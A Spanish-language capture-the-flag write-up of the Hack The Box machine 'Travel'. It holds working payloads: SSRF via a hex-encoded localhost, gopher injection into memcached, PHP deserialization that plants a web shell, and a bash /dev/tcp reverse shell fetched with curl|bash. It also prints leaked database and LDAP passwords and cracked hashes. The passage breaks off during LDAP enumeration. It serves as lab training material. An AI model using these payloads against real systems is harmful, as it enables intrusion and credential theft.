---
layout: post
title: Travel
date: 2023-04-04
description:
img:
fig-caption:
tags: [eWPT, OSWE, OSCP]
---
___

<center><img src="/writeups/assets/img/Travel-htb/Travel.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.189 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 20:50 GMT
Nmap scan report for 10.10.10.189
Host is up (0.061s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 16.18 seconds
```

### Escaneo de versión y servicios de cada puerto

```null

```

## Puerto 80 (HTTP) | Puerto 443 (HTTPS)

Con ```whatweb``` analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.189
http://10.10.10.189 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[hello@travel.htb], HTML5, HTTPServer[nginx/1.17.6], IP[10.10.10.189], JQuery, Script, Title[Travel.HTB], nginx[1.17.6]
```

```null
whatweb https://10.10.10.189
https://10.10.10.189 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.17.6], IP[10.10.10.189], Title[Travel.HTB - SSL coming soon.], nginx[1.17.6]
```

Agrego el dominio ```travel.htb``` y los subdominios ```www.travel.htb```, ```blog.travel.htb``` y ```blog-dev.travel.htb``` al ```/etc/hosts```

La páginas principales se ven así:

<img src="/writeups/assets/img/Travel-htb/1.png" alt="">

<img src="/writeups/assets/img/Travel-htb/2.png" alt="">

<img src="/writeups/assets/img/Travel-htb/3.png" alt="">

Enumero los usuarios del WordPress con ```wpscan```

```null
wpscan --url "http://blog.travel.htb" --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.travel.htb/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

En el código fuente está comentada la palabra ```DEBUG```

<img src="/writeups/assets/img/Travel-htb/4.png" alt="">

Al introducirlo cambia el comentario

<img src="/writeups/assets/img/Travel-htb/5.png" alt="">

Encuentro expusto un repositorio GIT

```null
dirsearch -u http://blog-dev.travel.htb/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/blog-dev.travel.htb/-_23-04-05_15-24-43.txt

Error Log: /root/.dirsearch/logs/errors-23-04-05_15-24-43.log

Target: http://blog-dev.travel.htb/

[15:24:43] Starting: 
[15:24:50] 301 -  170B  - /.git  ->  http://blog-dev.travel.htb/.git/
[15:24:50] 403 -  556B  - /.git/
[15:24:50] 403 -  556B  - /.git/branches/
[15:24:50] 200 -   92B  - /.git/config
[15:24:50] 200 -   73B  - /.git/description
[15:24:50] 200 -   13B  - /.git/COMMIT_EDITMSG
[15:24:50] 403 -  556B  - /.git/hooks/
[15:24:50] 200 -   23B  - /.git/HEAD
[15:24:50] 200 -  297B  - /.git/index
[15:24:50] 200 -  240B  - /.git/info/exclude
[15:24:50] 403 -  556B  - /.git/info/
[15:24:50] 200 -  153B  - /.git/logs/HEAD
[15:24:51] 200 -   41B  - /.git/refs/heads/master
[15:24:50] 200 -  153B  - /.git/logs/refs/heads/master
[15:24:50] 301 -  170B  - /.git/logs/refs  ->  http://blog-dev.travel.htb/.git/logs/refs/
[15:24:50] 301 -  170B  - /.git/logs/refs/heads  ->  http://blog-dev.travel.htb/.git/logs/refs/heads/
[15:24:50] 403 -  556B  - /.git/refs/
[15:24:51] 403 -  556B  - /.git/objects/
[15:24:50] 403 -  556B  - /.git/logs/
[15:24:51] 301 -  170B  - /.git/refs/heads  ->  http://blog-dev.travel.htb/.git/refs/heads/
[15:24:51] 301 -  170B  - /.git/refs/tags  ->  http://blog-dev.travel.htb/.git/refs/tags/

Task Completed
```

Utilizo ```git-dumper``` para recomponer el proyecto

```null
git-dumper http://blog-dev.travel.htb/ git
```

En los commits se puede ver un usuario

```null
git log
commit 0313850ae948d71767aff2cc8cc0f87a0feeef63 (HEAD -> master)
Author: jane <jane@travel.htb>
Date:   Tue Apr 21 01:34:54 2020 -0700

    moved to git
```

Está compuesto por lo siguiente:

```null
ls -la
drwxr-xr-x root root 4.0 KB Fri Apr  7 13:27:33 2023  .
drwxr-xr-x root root 4.0 KB Fri Apr  7 13:17:18 2023  ..
drwxr-xr-x root root 4.0 KB Fri Apr  7 13:28:02 2023  .git
.rwxr-xr-x root root 540 B  Fri Apr  7 13:27:33 2023  README.md
.rwxr-xr-x root root 2.9 KB Fri Apr  7 13:27:33 2023  rss_template.php
.rwxr-xr-x root root 1.4 KB Fri Apr  7 13:27:33 2023  template.php
```

Veo el ```README.md```

```null
mdcat README.md
┄Rss Template Extension

Allows rss-feeds to be shown on a custom wordpress page.

┄┄Setup

• git clone https://github.com/WordPress/WordPress.git
• copy rss_template.php & template.php to wp-content/themes/twentytwenty 
• create logs directory in wp-content/themes/twentytwenty 
• create page in backend and choose rss_template.php as theme

┄┄Changelog

• temporarily disabled cache compression
• added additional security checks 
• added caching
• added rss template

┄┄ToDo

• finish logging implementation
```

La ruta ```/wp-content/themes/twentytwenty``` existe junto al recurso en PHP

En el ```rss_template.php``` se está haciendo una llamada al ```memcached```

```null
$simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');
```

En el comentario del ```DEBUG```, puedo obtener parte del ```xct```, gracias a que incluye un archivo ```debug.php```

```null
<!--
DEBUG
<?php
if (isset($_GET['debug'])){
  include('debug.php');
}
?>
-->
```

En caso de que por POST se detecte el parámetro ```custom_feed_url```, es posible cargar un archivo XML

```null
if(strpos($url, "custom_feed_url") !== false){
    $tmp = (explode("=", $url));    
    $url = end($tmp);   
 } else {
    $url = "http://www.travel.htb/newsfeed/customfeed.xml";
}
```

Descargo el customfeed exitente y lo cargo desde mi equipo que está compartido en un servicio HTTP con python. En caso de volver a cargar el de por defecto, obtengo los dos customfeeds

```null
curl -s -X GET http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php
 ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
| xct_4e5612ba07(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |
| xct_ade330c3b8(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |
 ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
 ```

En caso de que pueda controlar el output serializado que me devuelve este script en PHP, podría obtener una ejecución remota de comandos. Se está importando un archivo que se encarga de deserializar la data

```null
require_once ABSPATH . '/wp-includes/class-simplepie.php';   
```

Es un archivo estandar que puedo encontrar en internet. Filtro por MD5, y encuentro una función que lo contempla

```null
public $cache_name_function = 'md5';
```
```null
public function __toString()
{
	return md5(serialize($this->data));
}
```

Y también por ```cache_name_function```

```null
$cache = $this->registry->call('Cache', 'get_handler', array($this->cache_location, call_user_func($this->cache_name_function, $file->url), 'spc'));
```

Le está pasando a la función ```call_user_func``` un cadena en MD5, que corresponde al ```cache_name_function``` y una URL. En el mismo repositorio de Github busco por el script que controla el ```memcache```. En concreto es el ```wp-includes/SimplePie/Cache/Memcache.php```

```null
$this->name = $this->options['extras']['prefix'] . md5("$name:$type");
```

La cadena que se transforma a MD5 está compuesta por dos variables. Una de nombre y otra de tipo. En el otro script se le estaba pasando la cadena 'spc'. Lo simulo con PHP

```null
curl -s -X GET 'http://blog.travel.htb/awesome-rss/?debug=test'
curl -s -X GET http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php
 ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
| xct_4e5612ba07(...) | a:4:{s:5:"child";a:1:{s:0:"";a:1:{(...) |
 ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
```

```null
php --interactive
Interactive shell

php > echo "xct_" . md5(md5("http://www.travel.htb/newsfeed/customfeed.xml") . ":spc");
xct_4e5612ba079c530a6b1f148c0b352241
```

La cadena coincide, por lo que es muy probable que corresponda al tipo. Veo el archivo ```template.php```

```null
function safe($url)
{
    // this should be secure
    $tmpUrl = urldecode($url);
    if(strpos($tmpUrl, "file://") !== false or strpos($tmpUrl, "@") !== false)
    {       
        die("<h2>Hacking attempt prevented (LFI). Event has been logged.</h2>");
    }
    if(strpos($tmpUrl, "-o") !== false or strpos($tmpUrl, "-F") !== false)
    {       
        die("<h2>Hacking attempt prevented (Command Injection). Event has been logged.</h2>");
    }
    $tmp = parse_url($url, PHP_URL_HOST);
    // preventing all localhost access
    if($tmp == "localhost" or $tmp == "127.0.0.1")
    {       
        die("<h2>Hacking attempt prevented (Internal SSRF). Event has been logged.</h2>");      
    }
    return $url;
}

function url_get_contents ($url) {
    $url = safe($url);
    $url = escapeshellarg($url);
    $pl = "curl ".$url;
    $output = shell_exec($pl);
    return $output;
}
```

Se está ejecutando un ```curl``` a nivel de sistema. Es posible llegar a conectarse al ```memcached``` introduciendo la IP en hexadecimal, ya que no está sanitizado

```null
memcache://0x7f000001:11211/?timeout=60&prefix=xct_
```

Utilizo la herramienta ````Gopherus```. Disponible en [Github](https://github.com/tarunkant/Gopherus). Esto se encarga de crear una data serializada que se interpretará a través del SSRF

```null
gopherus --exploit phpmemcache


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$


This is usable when you know Class and Variable name used by user

Give serialization payload
example: O:5:"Hello":0:{}   : Test

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%204%0d%0aTest%0d%0a

After everything done, you can delete memcached item by using this payload: 

gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a

-----------Made-by-SpyD3r-----------
```

Hay que tener en cuenta el formato de la IP para que esté en hexadecimal

```null
curl -s -X GET 'http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://0x7f000001:11211/_%0d%0aset%20SpyD3r%204%200%204%0d%0aTest%0d%0a'
```

```null
curl -s -X GET http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php
 ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
| SpyD3r | Test |
 ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
```

En el archivo ```template.php``` hay una clase

```null
class TemplateHelper
{

    private $file;
    private $data;

    public function __construct(string $file, string $data)
    {
        $this->init($file, $data);
    }

    public function __wakeup()
    {
        $this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {       
        $this->file = $file;
        $this->data = $data;
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
    }
}
```

La función ```__wakeup()``` es una Magic Function que se encargad e serializar los datos. Se le pasa como argumentos el nombre de un archivo y su contenido, para depositarlo posteriormente dentro del directorio ```/logs```

Creo un script en PHP que se encargue de serializar los datos

```null
<?php
class TemplateHelper
{

    public $file;
    public $data;

    public function __construct(string $file, string $data)
    {
        $this->init($file, $data);
    }

    public function __wakeup()
    {
        $this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {       
        $this->file = $file;
        $this->data = $data;
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
    }
}

$payload = new TemplateHelper("pwned.php", "<?php system(\$_REQUEST['cmd']); ?>");
echo serialize($payload);
?>
```

```null
mkdir logs
php serialize.php
O:14:"TemplateHelper":2:{s:4:"file";s:9:"pwned.php";s:4:"data";s:33:"<?php system($_REQUEST['cmd]); ?>";}
```

Utilizo de nuevo ```Gopherus``` para tramitar esta data serializada

```null
gopherus --exploit phpmemcache


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$


This is usable when you know Class and Variable name used by user

Give serialization payload
example: O:5:"Hello":0:{}   : O:14:"TemplateHelper":2:{s:4:"file";s:9:"pwned.php";s:4:"data";s:33:"<?php system($_REQUEST['cmd]); ?>";}

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20105%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22pwned.php%22%3Bs:4:%22data%22%3Bs:33:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27cmd%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a

After everything done, you can delete memcached item by using this payload: 

gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a

-----------Made-by-SpyD3r-----------
```

Además, tengo que sustituir el valor del ```xct``` donde está la cadena ```SpyD3r```. Envío toda la data, la interpreto y deserializo

```null
curl -s -X GET 'http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://0x7f000001:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20106%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22pwned.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27cmd%27%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a' 
```

```null
curl -s -X GET 'http://blog.travel.htb/awesome-rss/'
```

```null
curl -s -X GET 'http://blog.travel.htb/wp-content/themes/twentytwenty/logs/pwned.php?cmd=whoami'
www-data
```

Creo un ```index.html`` que se encargue de enviarme una reverse shell

```null
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.3/443 0>&1
```

Lo comparto con un servicio HTTP con python y gano acceso a un contenedor

```null
python3 -m http.server 80
curl -s -X GET 'http://blog.travel.htb/wp-content/themes/twentytwenty/logs/pwned.php?cmd=curl+10.10.16.3|bash'
```

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.189.
Ncat: Connection from 10.10.10.189:57548.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@blog:/var/www/html/wp-content/themes/twentytwenty/logs$ script /dev/null -c bash
</themes/twentytwenty/logs$ script /dev/null -c bash             
Script started, file is /dev/null
www-data@blog:/var/www/html/wp-content/themes/twentytwenty/logs$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
</wp-content/themes/twentytwenty/logs$ export TERM=xterm                     
shw-data@blog:/var/www/html/wp-content/themes/twentytwenty/logs$ export SHELL=ba 
lumns 209blog:/var/www/html/wp-content/themes/twentytwenty/logs$ stty rows 55 co 
```

```null
www-data@blog:/var/www/html/wp-content/themes/twentytwenty/logs$ hostname -I
172.30.0.10 
```

Obtengo las credenciales de acceso a la base de datos del ```wp-config.php```

```null
/** MySQL database username */
define( 'DB_USER', 'wp' );

/** MySQL database password */
define( 'DB_PASSWORD', 'fiFtDDV9LYe8Ti' );
```

Me conecto al ```MySQL`` 

```null
www-data@blog:/var/www/html$ mysql -uwp -pfiFtDDV9LYe8Ti
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 59
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

Obtengo un hash para el usuario ```admin``` del WordPress

```null
ariaDB [wp]> select user_email,user_pass from wp_users;
+------------------+------------------------------------+
| user_email       | user_pass                          |
+------------------+------------------------------------+
| admin@travel.htb | $P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/ |
+------------------+------------------------------------+
1 row in set (0.001 sec)
```

No se puede crackear por fuerza bruta. En el directorio ```/opt``` hay otro ```WordPress```

```null
www-data@blog:/opt$ ls
wordpress
```

Contiene un backup

```null
www-data@blog:/opt/wordpress$ ls
backup-13-04-2020.sql
```

Dentro hay otro hash

```null
www-data@blog:/opt/wordpress$ cat backup-13-04-2020.sql | grep -oP '\$P.*'
$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb','http://localhost','2020-04-13 13:19:01','',0,'admin'),(2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik@travel.htb','','2020-04-13 13:36:18','',0,'Lynik Schmidt');
```

Obtengo la contraseña

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1stepcloser      (?)     
1g 0:00:00:35 DONE (2023-04-08 10:10) 0.02843g/s 20799p/s 20799c/s 20799C/s 1stuna..1996sh
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 
```

Se reutiliza por SSH

```null
ssh lynik-admin@10.10.10.189
The authenticity of host '10.10.10.189 (10.10.10.189)' can't be established.
ED25519 key fingerprint is SHA256:Nt7Z0XNIx0fl2NzU79G5kFr/gbwGpuTzt7Bst14vooo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.189' (ED25519) to the list of known hosts.
lynik-admin@10.10.10.189's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-26-generic x86_64)

  System information as of Sat 08 Apr 2023 10:12:41 AM UTC

  System load:                      0.0
  Usage of /:                       46.0% of 15.68GB
  Memory usage:                     11%
  Swap usage:                       0%
  Processes:                        205
  Users logged in:                  0
  IPv4 address for br-836575a2ebbb: 172.20.0.1
  IPv4 address for br-8ec6dcae5ba1: 172.30.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.10.189

lynik-admin@travel:~$ cat user.txt 
64cc7be2cfaffd145514bbdba5a04a01
```

# Escalada

En el directorio personal de este usuario hay un archivo de configuración del LDAP

```null
lynik-admin@travel:/$ find \-user $(whoami) 2>/dev/null | grep -vE "proc|run|sys|dev"
./home/lynik-admin
./home/lynik-admin/.bash_logout
./home/lynik-admin/.bashrc
./home/lynik-admin/.cache
./home/lynik-admin/.cache/motd.legal-displayed
./home/lynik-admin/.bash_history
./home/lynik-admin/.viminfo
./home/lynik-admin/.profile
./home/lynik-admin/.ldaprc
```

Su contenido es el siguiente

```null
lynik-admin@travel:~$ cat .ldaprc 
HOST ldap.travel.htb
BASE dc=travel,dc=htb
BINDDN cn=lynik-admin,dc=travel,dc=htb
```

En ```.viminfo``` hay almacenadas credenciales en texto claro

```null
lynik-admin@travel:~$ cat .viminfo  | grep -i pw
	BINDPW Theroadlesstraveled
|3,1,1,1,1,0,1587670528,"BINDPW Theroadlesstraveled"
```

Obtengo usuarios tramitando peticiones al LDAP

```null
lynik-admin@travel:~$ ldapsearch -x -h ldap.travel.htb -w 'Theroadlesstraveled' | grep memberUid | awk '{print $2}'
frank
brian
christopher
johnny
julia
jerry
louise
eugene
edward
gloria
lynik
```

Me conecto desde mi equipo a través de [Apache Directory Studio](https://directory.apache.org/studio/download/download-linux.html). Como el LDAP no está expuesto, me traigo el puerto con un Local Port Forwarding

```null
ssh lynik-admin@10.10.10.189 -L 9389:localhost:389
```

Agrego la conexión

<img src="/writeups/assets/img/Travel-htb/6.png" alt="">

